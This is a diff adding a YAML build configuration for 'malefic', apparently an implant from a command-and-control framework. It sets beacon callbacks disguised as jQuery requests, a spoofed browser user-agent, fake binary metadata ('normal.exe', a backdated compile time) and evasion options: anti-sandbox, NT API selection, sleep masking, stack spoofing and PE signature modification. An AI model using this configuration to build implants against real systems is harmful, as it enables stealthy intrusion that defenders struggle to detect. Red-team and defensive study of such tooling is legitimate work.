@@ -1,0 +1,143 @@
+basic:
+  name: "malefic"
+  targets:
+    - "127.0.0.1:5001"
+  protocol: "tcp"
+  tls:
+    enable: true                    # 启用TLS
+    version: "auto"                 # TLS版本: "auto", "1.2", "1.3"
+    sni: "localhost"                # 服务器名称指示（SNI）
+    skip_verification: true
+  #    mtls:                           # mTLS客户端证书配置（可选）
+  #      enable: false                 # 启用mTLS
+  #      client_cert: "client.crt"     # 客户端证书文件路径
+  #      client_key: "client.key"      # 客户端私钥文件路径
+  #      server_ca: ""                 # 用于验证服务端的CA证书路径（可选）
+  proxy: ""
+  interval: 5
+  jitter: 0.2
+  encryption: aes
+  key: maliceofinternal
+  rem:
+    link: ""
+  http:
+    method: "POST"
+    path: "/jquery.js"
+    host: "127.0.0.1"
+    version: "1.1"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
+      Content-Type: "application/octet-stream"
+      #any-header: any-value
+
+build:
+  zigbuild: false
+  remap: false # Force refresh remap-path-prefix configuration even if it already exists
+  toolchain: "nightly-2023-09-18"
+  ollvm:
+    enable: false
+    bcfobf: false # Bogus Control Flow Obfuscation
+    splitobf: false # Split Control Flow Obfuscation
+    subobf: false # Instruction Substitution Obfuscation
+    fco: false # Function CallSite  Obfuscation
+    constenc: false # Constant Encryption Obfuscation
+  metadata:
+    remap_path: "C:/Windows/Users/"
+    icon: ""
+    compile_time: "24 Jun 2015 18:03:01"
+    file_version: ""
+    product_version: ""
+    company_name: ""
+    product_name: ""
+    original_filename: "normal.exe"
+    file_description: "normal"
+    internal_name: ""
+    require_admin: false  # whether to require admin privilege
+    require_uac: false    # whether to require uac privilege
+
+pulse:
+  flags:
+    start: 0x41
+    end: 0x42
+    magic: "beautiful"
+    artifact_id: 0
+  encryption: xor
+  key: "maliceofinternal"
+  target: 127.0.0.1:80
+  protocol: "http"
+  http:
+    method: "POST"
+    path: "/pulse"
+    host: "127.0.0.1"
+    version: "1.1"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
+
+
+implants:
+  runtime: tokio          # async runtime: smol/tokio/async-std
+  mod: beacon             # malefic mod: beacon/bind
+  register_info: true     # whether collect sysinfo when register
+  hot_load: true          # enable hot load module
+  modules:                # module when malefic compile
+    - "full"
+  enable_3rd: false       # enable 3rd module
+  3rd_modules:            # 3rd module when malefic compile
+    #    - curl
+    #    - rem_static
+    - full
+
+  autorun: ""             # autorun config filename
+  pack:                   # pack
+  #    - src: "1.docx"
+  #      dst: "1.docs"
+  flags:
+    start: 0x41
+    end: 0x42
+    magic: "beautiful"
+    artifact_id: 0x1
+
+  # for professional
+  anti: # 反沙箱反调试反编译反取证相关
+    sandbox: false
+    vm: false            # enable anti vm
+    # debug: true         # enable anti debug
+    # disasm: true        # enable anti disasm
+    # emulator: true      # enable anti emulator
+    # forensic: true      # enable anti forensic
+
+  apis:
+    # apis_level: "sys_apis", "nt_apis"
+    level: "nt_apis"
+    # apis_priority: "normal", "user_defined_dyanmic", "func_syscall" "syscalls"
+    priority:
+      normal:
+        enable: false
+        type: "normal"
+      dynamic:
+        enable: true
+        # type: "sys_dynamic", "user_defined_dynamic"
+        type: "user_defined_dynamic"
+      syscalls:
+        enable: false
+        # type: "func_syscall", "inline_syscall"
+        type: "inline_syscall"
+  alloctor:
+    # inprocess: "VirtualAlloc", "VirtualAllocEx",
+    #            "VirtualAllocExNuma", "HeapAlloc",
+    #            "NtMapViewOfSection", "NtAllocateVirtualMemory"
+    inprocess: "NtAllocateVirtualMemory"
+    # allocter_ex: "VirtualAllocEx", "NtAllocateVirtualMemory",
+    #              "VirtualAllocExNuma", "NtMapViewOfSection"
+    crossprocess: "NtAllocateVirtualMemory"
+  sleep_mask: true
+  stack_spool: true
+  sacrifice_process: true
+  fork_and_run: false
+  hook_exit: true
+  thread_stack_spoofer: true
+  pe_signature_modify:
+    feature: true
+    modify:
+      magic: "\x00\x00"
+      signature: "\x00\x00"
